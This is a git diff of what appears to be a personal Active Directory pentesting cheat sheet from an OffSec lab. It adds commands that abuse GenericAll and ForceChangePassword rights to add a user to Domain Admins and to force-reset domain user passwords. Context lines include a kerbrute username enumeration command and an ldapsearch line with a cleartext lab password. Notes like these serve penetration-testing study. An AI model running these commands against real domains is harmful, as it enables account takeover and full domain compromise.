@@ -18,4 +18,14 @@ ldapsearch -v -x -D fmcsorley@HUTCH.OFFSEC -w CrabSharkJellyfish192 -b "DC=hutch
 # kerbrute usernames
 ./kerbrute userenum -d <DOMAIN> --dc <DC_IP> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
 
+# GenericAll WriteProperty
+net group "domain admins" <DOMAIN_USER> /add /domain
+Add-ADGroupMember -Identity "domain admins" -Members <DOMAIN_USER>
+
+# powerview: ForceChangePassword AllExtendedRights GenericAll User-Force-Change-Password
+Set-DomainUserPassword -Identity <DOMAIN_USER> -AccountPassword (ConvertTo-SecureString 'Password1' -AsPlainText -Force) -Verbose
+
+# ForceChangePassword AllExtendedRights GenericAll User-Force-Change-Password
+net user <DOMAIN_USER> <PASSWORD> /domain
+
 $ LHOST: ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p'
